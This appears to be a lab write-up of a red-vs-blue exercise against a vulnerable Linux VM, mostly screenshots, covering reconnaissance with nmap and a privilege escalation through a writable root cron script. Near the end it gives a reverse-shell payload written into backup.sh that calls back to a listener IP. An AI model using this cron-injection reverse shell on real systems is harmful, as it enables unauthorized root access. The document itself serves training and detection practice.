# Privilege Escalation Detection Lab: Red vs Blue Simulation
real-world cyber attack against a vulnerable Linux server and demonstrates how such activity can be detected using the ELK Stack.

started 17:25 

Information gathering about victim machine

PING SWEEP OF POSSIBLE HOSTS ON NETWORK, OUR INTEREST IS victim2
<img src="pingsweep.png" alt="Ping sweep result" width="500">

<img width="600" src="https://github.com/user-attachments/assets/061ca039-cfdd-412f-b1a1-2e805f7beb7b" />

nmap --script smb-os-discovery <ip>

<img width="501" src="https://github.com/user-attachments/assets/00a37059-2638-4f97-9d40-cd8a5be4e07c" />


Exploit:

<img width="1447" src="https://github.com/user-attachments/assets/f25bf71c-41a8-4386-b8a9-7349c6e6f2b6" />


<img width="1098" src="https://github.com/user-attachments/assets/224c0323-cd18-4a83-b056-c3413f8aa78e" />

ROOT ACCESS


DISCOVERY PHASE

<img width="720" height="608" alt="image" src="https://github.com/user-attachments/assets/c22198c4-a8db-4ff1-b486-3c6626e547ca" />

<img width="772" height="43" alt="image" src="https://github.com/user-attachments/assets/ed153a6c-9fc7-418b-832f-2de09ebcc01f" />
SUDOERS IS WRITABLE FILE

<img width="723" height="504" alt="image" src="https://github.com/user-attachments/assets/e8f37139-eea8-4cb0-91fa-23569d7aceb1" />
Several active ports and servuces, such as those mentioned in nmap in addition to local services local in localservice itself. 

<img width="455" src="https://github.com/user-attachments/assets/82a870fc-cbbf-45b3-ac5f-1b05b7752440" />

There is no crontab configured but there are several jobs running under "cron.daily" and "cron.weekly". Some of the cron directories are writable, which means a low privileged user could modify the .sh scripts. If that happens, maliious commands could be executed seamlessly with root privileges, leading to privilege escalation. Critical yet we want to attack now, try find entry point

<img width="963" height="450" alt="image" src="https://github.com/user-attachments/assets/c5fe70f0-aef9-4dd9-be3a-82ac8a73ff14" />

backup.sh, running every minute. we can try feed in malicious script but need to locate


<img width="174" height="249" alt="image" src="https://github.com/user-attachments/assets/47709978-7deb-4c7b-9f50-cbf633c8b717" />

found in /lucas directory, probably a user hehe. Inject malicious reverse shell script

printf '#!/bin/bash\nbash -i >& /dev/tcp/192.168.42.234/4444 0>&1\n' > backup.sh

 <img width="755" height="43" alt="image" src="https://github.com/user-attachments/assets/218e094f-fcef-490b-9268-3788580a51c5" />

meterpreter seemingly responded well on the request

We now have root access from user 
